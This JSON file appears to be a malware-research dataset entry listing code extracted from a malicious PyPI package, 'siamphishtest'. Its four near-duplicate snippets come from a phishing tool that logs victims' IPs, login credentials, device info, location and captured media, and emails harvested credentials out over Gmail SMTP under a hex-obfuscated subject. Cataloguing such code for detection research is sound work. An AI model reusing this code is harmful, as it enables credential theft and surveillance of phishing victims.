[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/siamphishtest-2.1.8-py3-none-any/siam/linux.py",
    "malicious_code": "from smtplib import SMTP_SSL as smtp\n\n# ... (other code omitted for brevity)\n\n# Send mail by smtp library\ndef send_mail(msg):\n    global email, password, receiver\n    message = f\"From: {email}\\nTo: {receiver}\\nSubject: \\x4d\\x61\\x78\\x50\\x68\\x69\\x73\\x68\\x65\\x72 Login Credentials\\n\\n{msg}\"\n    try:\n        internet()\n        with smtp('smtp.gmail.com', 465) as server:\n            server.login(email, password)\n            server.sendmail(email, receiver, message) \n    except Exception as e:\n        append(e, error_file)\n        print(f\"{error}{str(e)}\")\n\n# ... (other code omitted for brevity)\n\ndef waiter():\n    global is_mail_ok\n    delete(ip_file, cred_file, log_file)\n    for file in get_media():\n        remove(file)\n    sprint(f\"\\n{info}{blue}Waiting for login info....{cyan}Press {red}Ctrl+C{cyan} to exit\")\n    try:\n        while True:\n            if isfile(ip_file):\n                print(f\"\\n\\n{success}{bgreen}Victim IP found!\\n\\007\")\n                show_file_data(ip_file)\n                ipdata = cat(ip_file)\n                append(ipdata, main_ip)\n                # Just add the ip\n                append(ipdata.split(\"\\n\")[0], saved_file)\n                print(f\"\\n{info2}Saved in {main_ip}\")\n                print(f\"\\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit\")\n                remove(ip_file)\n            if isfile(cred_file):\n                print(f\"\\n\\n{success}{bgreen}Victim login info found!\\n\\007\")\n                show_file_data(cred_file)\n                userdata = cat(cred_file)\n                if is_mail_ok:\n                    send_mail(userdata)\n                append(userdata, main_cred)\n                append(userdata, saved_file)\n                add_json(text2json(userdata), cred_json)\n                print(f\"\\n{info2}Saved in {main_cred}\")\n                print(f\"\\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit\")\n                remove(cred_file)\n            if isfile(info_file):\n                print(f\"\\n\\n{success}{bgreen}Victim Info found!\\n\\007\")\n                show_file_data(info_file)\n                info_data = cat(info_file)\n                append(info_data, main_info)\n                add_json(text2json(info_data), info_json)\n                print(f\"\\n{info2}Saved in {main_info}\")\n                print(f\"\\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit\")\n                remove(info_file)\n            if isfile(location_file):\n                print(f\"\\n\\n{success}{bgreen}Victim Location found!\\n\\007\")\n                show_file_data(location_file)\n                location_data = cat(location_file)\n                append(location_data, main_location)\n                add_json(text2json(location_data), location_json)\n                print(f\"\\n{info2}Saved in {main_location}\")\n                print(f\"\\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit\")\n                remove(location_file)\n            if isfile(log_file):\n                print(f\"\\n{success}{bgreen}Media file captured!\\007\")\n                for file in get_media():\n                    copy(file, directory)\n                    remove(file)\n                    print(f\"\\n{info2}{green}{basename(file)} {cyan}saved in {green}{directory}\")\n                print(f\"\\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit\")\n                if get_media()==[]:\n                    remove(log_file)\n            sleep(0.75)\n    except KeyboardInterrupt:\n        pexit()\n"
  },
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/siamphishtest-2.1.8-py3-none-any/siam/win.py",
    "malicious_code": "from smtplib import SMTP_SSL as smtp\n\ndef send_mail(msg):\n    global email, password, receiver\n    message = f\"From: {email}\\nTo: {receiver}\\nSubject: \\x4d\\x61\\x78\\x50\\x68\\x69\\x73\\x68\\x65\\x72 Login Credentials\\n\\n{msg}\"\n    try:\n        internet()\n        with smtp('smtp.gmail.com', 465) as server:\n            server.login(email, password)\n            server.sendmail(email, receiver, message) \n    except Exception as e:\n        append(e, error_file)\n        print(f\"{error}{str(e)}\")\n\n# ...\n\n# Last function capturing credentials\ndef waiter():\n    global is_mail_ok\n    delete(ip_file, cred_file, log_file)\n    for file in get_media():\n        remove(file)\n    sprint(f\"\\n{info}{blue}Waiting for login info....{cyan}Press {red}Ctrl+C{cyan} to exit\")\n    try:\n        while True:\n            if isfile(ip_file):\n                print(f\"\\n\\n{success}{bgreen}Victim IP found!\\n\\007\")\n                show_file_data(ip_file)\n                ipdata = cat(ip_file)\n                append(ipdata, main_ip)\n                # Just add the ip\n                append(ipdata.split(\"\\n\")[0], saved_file)\n                print(f\"\\n{info2}Saved in {main_ip}\")\n                print(f\"\\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit\")\n                remove(ip_file)\n            if isfile(cred_file):\n                print(f\"\\n\\n{success}{bgreen}Victim login info found!\\n\\007\")\n                show_file_data(cred_file)\n                userdata = cat(cred_file)\n                if is_mail_ok:\n                    send_mail(userdata)\n                append(userdata, main_cred)\n                append(userdata, saved_file)\n                add_json(text2json(userdata), cred_json)\n                print(f\"\\n{info2}Saved in {main_cred}\")\n                print(f\"\\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit\")\n                remove(cred_file)\n            if isfile(info_file):\n                print(f\"\\n\\n{success}{bgreen}Victim Info found!\\n\\007\")\n                show_file_data(info_file)\n                info_data = cat(info_file)\n                append(info_data, main_info)\n                add_json(text2json(info_data), info_json)\n                print(f\"\\n{info2}Saved in {main_info}\")\n                print(f\"\\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit\")\n                remove(info_file)\n            if isfile(location_file):\n                print(f\"\\n\\n{success}{bgreen}Victim Location found!\\n\\007\")\n                show_file_data(location_file)\n                location_data = cat(location_file)\n                append(location_data, main_location)\n                add_json(text2json(location_data), location_json)\n                print(f\"\\n{info2}Saved in {main_location}\")\n                print(f\"\\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit\")\n                remove(location_file)\n            if isfile(log_file):\n                print(f\"\\n{success}{bgreen}Media file captured!\\007\")\n                for file in get_media():\n                    copy(file, directory)\n                    remove(file)\n                    print(f\"\\n{info2}{green}{basename(file)} {cyan}saved in {green}{directory}\")\n                print(f\"\\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit\")\n                if get_media()==[]:\n                    remove(log_file)\n            sleep(0.75)\n    except KeyboardInterrupt:\n        pexit()\n"
  },
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/siamphishtest-2.1.8-py3-none-any/siam/bomber.py",
    "malicious_code": "from smtplib import SMTP_SSL as smtp\n\n# ... (other code omitted for brevity)\n\n# Send mail by smtp library\ndef send_mail(msg):\n    global email, password, receiver\n    message = f\"From: {email}\\nTo: {receiver}\\nSubject: \\x4d\\x61\\x78\\x50\\x68\\x69\\x73\\x68\\x65\\x72 Login Credentials\\n\\n{msg}\"\n    try:\n        internet()\n        with smtp('smtp.gmail.com', 465) as server:\n            server.login(email, password)\n            server.sendmail(email, receiver, message) \n    except Exception as e:\n        append(e, error_file)\n        print(f\"{error}{str(e)}\")\n\n# ... (other code omitted for brevity)\n\ndef waiter():\n    global is_mail_ok\n    delete(ip_file, cred_file, log_file)\n    for file in get_media():\n        remove(file)\n    sprint(f\"\\n{info}{blue}Waiting for login info....{cyan}Press {red}Ctrl+C{cyan} to exit\")\n    try:\n        while True:\n            if isfile(ip_file):\n                print(f\"\\n\\n{success}{bgreen}Victim IP found!\\n\\007\")\n                show_file_data(ip_file)\n                ipdata = cat(ip_file)\n                append(ipdata, main_ip)\n                # Just add the ip\n                append(ipdata.split(\"\\n\")[0], saved_file)\n                print(f\"\\n{info2}Saved in {main_ip}\")\n                print(f\"\\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit\")\n                remove(ip_file)\n            if isfile(cred_file):\n                print(f\"\\n\\n{success}{bgreen}Victim login info found!\\n\\007\")\n                show_file_data(cred_file)\n                userdata = cat(cred_file)\n                if is_mail_ok:\n                    send_mail(userdata)\n                append(userdata, main_cred)\n                append(userdata, saved_file)\n                add_json(text2json(userdata), cred_json)\n                print(f\"\\n{info2}Saved in {main_cred}\")\n                print(f\"\\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit\")\n                remove(cred_file)\n            if isfile(info_file):\n                print(f\"\\n\\n{success}{bgreen}Victim Info found!\\n\\007\")\n                show_file_data(info_file)\n                info_data = cat(info_file)\n                append(info_data, main_info)\n                add_json(text2json(info_data), info_json)\n                print(f\"\\n{info2}Saved in {main_info}\")\n                print(f\"\\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit\")\n                remove(info_file)\n            if isfile(location_file):\n                print(f\"\\n\\n{success}{bgreen}Victim Location found!\\n\\007\")\n                show_file_data(location_file)\n                location_data = cat(location_file)\n                append(location_data, main_location)\n                add_json(text2json(location_data), location_json)\n                print(f\"\\n{info2}Saved in {main_location}\")\n                print(f\"\\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit\")\n                remove(location_file)\n            if isfile(log_file):\n                print(f\"\\n{success}{bgreen}Media file captured!\\007\")\n                for file in get_media():\n                    copy(file, directory)\n                    remove(file)\n                    print(f\"\\n{info2}{green}{basename(file)} {cyan}saved in {green}{directory}\")\n                print(f\"\\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit\")\n                if get_media()==[]:\n                    remove(log_file)\n            sleep(0.75)\n    except KeyboardInterrupt:\n        pexit()\n"
  },
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/siamphishtest-2.1.8-py3-none-any/siam/windows.py",
    "malicious_code": "from smtplib import SMTP_SSL as smtp\n\n# ... (other code omitted for brevity)\n\nemail_file = \"files/email.json\"\nis_mail_ok = False\nemail = \"\"\npassword = \"\"\nreceiver = \"\"\n\n# ... (other code omitted for brevity)\n\ndef send_mail(msg):\n    global email, password, receiver\n    message = f\"From: {email}\\nTo: {receiver}\\nSubject: \\x4d\\x61\\x78\\x50\\x68\\x69\\x73\\x68\\x65\\x72 Login Credentials\\n\\n{msg}\"\n    try:\n        internet()\n        with smtp('smtp.gmail.com', 465) as server:\n            server.login(email, password)\n            server.sendmail(email, receiver, message) \n    except Exception as e:\n        append(e, error_file)\n        print(f\"{error}{str(e)}\")\n\n# ... (other code omitted for brevity)\n\ndef requirements():\n    global termux, nr_command, cf_command, lx_command, is_mail_ok, email, password, receiver\n    # ... (other code omitted for brevity)\n    email_config = cat(email_file)\n    if is_json(email_config):\n        email_json = parse(email_config)\n        email = email_json[\"email\"]\n        password = email_json[\"password\"]\n        receiver = email_json[\"receiver\"]\n        # As the server is of gmail, we only allow gmail login\n        if \"@gmail.com\" in email:\n            is_mail_ok = True\n        else:\n            print(f\"\\n{error}Only gmail with app password is allowed!{nc}\")\n            sleep(1)\n\n# ... (other code omitted for brevity)\n\ndef waiter():\n    global is_mail_ok\n    delete(ip_file, cred_file, log_file)\n    for file in get_media():\n        remove(file)\n    sprint(f\"\\n{info}{blue}Waiting for login info....{cyan}Press {red}Ctrl+C{cyan} to exit\")\n    try:\n        while True:\n            # ... (other code omitted for brevity)\n            if isfile(cred_file):\n                print(f\"\\n\\n{success}{bgreen}Victim login info found!\\n\\007\")\n                show_file_data(cred_file)\n                userdata = cat(cred_file)\n                if is_mail_ok:\n                    send_mail(userdata)\n                append(userdata, main_cred)\n                append(userdata, saved_file)\n                add_json(text2json(userdata), cred_json)\n                print(f\"\\n{info2}Saved in {main_cred}\")\n                print(f\"\\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit\")\n                remove(cred_file)\n            # ... (other code omitted for brevity)\n            sleep(0.75)\n    except KeyboardInterrupt:\n        pexit()\n"
  }
]